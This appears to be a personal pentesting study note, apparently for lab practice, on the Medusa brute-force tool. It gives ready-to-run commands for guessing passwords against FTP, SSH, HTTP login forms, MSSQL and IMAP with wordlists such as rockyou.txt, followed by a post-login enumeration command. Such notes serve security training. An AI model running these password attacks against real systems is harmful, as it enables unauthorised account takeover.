---
tags: [basics, tool, brute-force]
---


> [!info] See also: [[Techniques/Password Cracking/Password Attacks]]

Parallel, modular brute-force tool. Supports many protocols: FTP, SSH, HTTP, SMB, MSSQL, MySQL, RDP, etc.

![[medusa_usage.png]]

## Syntax 

```bash
medusa [target_options] [credential_options] -M module [module_options]
```

## Basic usage

```bash
# Basic: -u user, -P wordlist, -h host, -M module
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp

# Multiple users from file (-U), single password (-p)
medusa -U users.txt -p Password123 -h 10.129.203.7 -M ssh

# SSH with parallel threads
medusa -h <IP> -n <PORT> -U SSHUSER -p some_passwordlist.txt -M ssh -t 3

# Brute force HTTP form login (DIR+FORM module options)
medusa -h 10.129.203.7 -U users.txt -P passwords.txt -M http -m DIR:/login.php -m FORM:"user=^USER^&pass=^PASS^:Invalid"

# MSSQL brute force
medusa -h 10.129.203.7 -U users.txt -P passwords.txt -M mssql

# IMAP brute force
medusa -M imap -h mail.example.com -U users.txt -P passwords.txt 

# List available modules
medusa -d
```

After login, check the attack surface:
```bash
netstat -tulpn | grep LISTEN
```

Key flags:
- `-t` — number of parallel login attempts per host
- `-T` — number of parallel hosts to test
- `-f` — stop after first valid credential found
- `-v` — verbosity level (0-6)
